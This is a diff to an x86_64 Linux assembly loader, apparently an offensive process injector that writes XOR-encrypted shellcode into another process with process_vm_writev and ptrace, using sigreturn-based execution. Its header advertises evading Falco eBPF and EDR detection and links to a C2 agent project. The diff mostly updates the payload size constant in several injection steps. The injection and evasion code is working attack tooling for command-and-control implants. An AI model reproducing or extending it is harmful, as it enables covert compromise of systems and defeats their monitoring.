@@ -20,6 +20,7 @@
 ; Architecture : x86_64 Linux (Advanced Process Injector)
 ; License : GNU AGPLv3 (Proprietary licensing available on request)
 ; ------------------------------------------------------------------------------------------------------
+; SROP-Assisted Cross-Memory Attach (CMA) Injection via Direct Syscalls.
 ; Features:
 ;   - Stealth Injection : Significantly reduces detection surface on Falco eBPF/EDRs.
 ;   - SROP Execution    : Uses rt_sigreturn (Syscall 15) to minimize ptrace noise and context hijacking.
@@ -30,7 +31,7 @@
 ; This loader is provided WITHOUT a default payload for safety and modularity.
 ; 1. To test, insert your x64 PIC shellcode into 'c2_payload' below.
 ; 2. Ensure your payload is XOR-encrypted with the key '0xACDAABBBA2BC1337'.
-; 3. Update the payload size (currently set to placeholder 1632) in Phase 3.
+; 3. Update the payload size (currently set to placeholder 2183) in Phase 3.
 ; For a full-scale integration test, visit: https://github.com/JM00NJ/ICMP-Ghost-A-Fileless-x64-Assembly-C2-Agent
 ; ======================================================================================================
 
@@ -424,7 +425,7 @@ x4_syscall:
     ; Not: .data section writable (RW) olmalıdır, veya veriyi .bss'e kopyalayıp çözmelisin.
     ; Varsayalım c2_payload .data içinde değiştirilebilir durumda (W^X sorunu yoksa):
     
-    mov r12, 1632
+    mov r12, 2183
     lea r9, [rel c2_payload]
     mov r14, 0xACDAABBBA2BC1337  ; TAM 8 Bayt (QWORD) Anahtar
 
@@ -441,11 +442,11 @@ _decrypt_local_loop:
     
     lea rax, [rel c2_payload]
     mov [rel local_iov], rax          ; iov_base = c2_payload adresi
-    mov qword [rel local_iov + 8], 1632 ; iov_len = Shellcode boyutu
+    mov qword [rel local_iov + 8], 2183 ; iov_len = Shellcode boyutu
 
     mov rbx, qword [c2_address]       ; mmap'ten dönen güvenli alan
     mov [rel remote_iov], rbx         ; iov_base = Hedef adres
-    mov qword [rel remote_iov + 8], 1632 ; iov_len = Yazılacak boyut
+    mov qword [rel remote_iov + 8], 2183 ; iov_len = Yazılacak boyut
 
     ; Syscall 311 Ateşle!
     mov rax, 311                      ; sys_process_vm_writev
@@ -577,7 +578,7 @@ x10_syscall:
     
     ; --- 1. POKEDATA (İlk 8 Bayt) ---
     mov rbx, qword [c2_address]
-    add rbx, 1632                   ; Payload Bitişi!
+    add rbx, 2183                   ; Payload Bitişi!
     
     mov qword [rbp + 0x68], 5       ; PTRACE_POKEDATA
     mov [rbp + 0x88], rbx           ; RDX = Yazılacak Adres
